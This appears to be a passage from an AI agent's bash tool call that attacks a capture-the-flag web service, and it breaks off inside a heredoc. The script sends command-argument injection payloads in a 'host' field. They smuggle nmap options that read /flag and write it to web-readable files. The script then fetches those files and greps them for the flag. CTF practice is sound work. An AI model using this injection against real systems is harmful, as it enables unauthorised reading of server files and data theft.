exec
/bin/bash -lc "set -o pipefail
TARGET='http://53653037b8441eb267c2487f.http-ctf2.dasctf.com:80'
OUT=/tmp/manual_web_e7d2ef75620f/single_quote_exploit
mkdir -p \""'$OUT"
payloads=(
  "127.0.0.1'"' -iL /flag -oN flag.txt '\"
  \"' -iL /flag -oN flag2.txt '\"
  \"127.0.0.1' -iL /flag -oG flag.gnmap '\"
  \"127.0.0.1' -iL /flag -oX flag.xml '\"
)
idx=0
for payload in \""'${payloads[@]}"; do
  idx=$((idx+1))
  hdr="$OUT/$idx.headers"; body="$OUT/$idx.body"; meta="$OUT/$idx.meta"; xml="$OUT/$idx.xml"
  printf '"'%s\\n' \""'$payload" > "$meta"
  code=$(curl -sS --max-time 25 -D "$hdr" -o "$body" -w '"'%{http_code}' -X POST --data-urlencode \"host="'$payload" "$TARGET/" || true)
  loc=$(awk '"'BEGIN{IGNORECASE=1} /"'^Location:/ {gsub("'"\\r\",\"\"); print "'$2; exit}'"' \""'$hdr")
  id=${loc##*=}
  printf '"'\\n### [%02d] payload=%s status=%s location=%s\\n' \""'$idx" "$payload" "$code" "$loc"
  if [ -n "$loc" ]; then
    curl -sS -i --max-time 15 "$TARGET/xml/$id" > "$xml" || true
    grep -Eai '"'scan initiated|args=|target specification|flag\\{|ctf\\{|FLAG\\{|CTF\\{|Failed|Unable|Invalid|Nmap done|error' \""'$xml" | head -n 100 || true
  else
    sed -n '"'1,100p' \""'$hdr"; sed -n '"'1,80p' \""'$body"
  fi
done
printf '"'\\n### written file probes\\n'
for p in /flag.txt /flag2.txt /flag.gnmap /flag.xml; do
  safe="'$(printf '"'%s' \""'$p" | tr '"'/' '_')
  printf '\\n--- %s ---\\n' \""'$p"
  curl -sS -i --max-time 8 "$TARGET$p" | tee "$OUT/${safe}.http" | sed -n '"'1,220p'
done
status="'$?
flag=$(grep -RaoE '"'(flag|FLAG|ctf|CTF)\\{["'^}]+'"\\}' \""'$OUT" 2>/dev/null | head -n 1 | sed '"'s/"'^.*://'"')
tmp="'$(mktemp)
cat > "$tmp" <<EOF
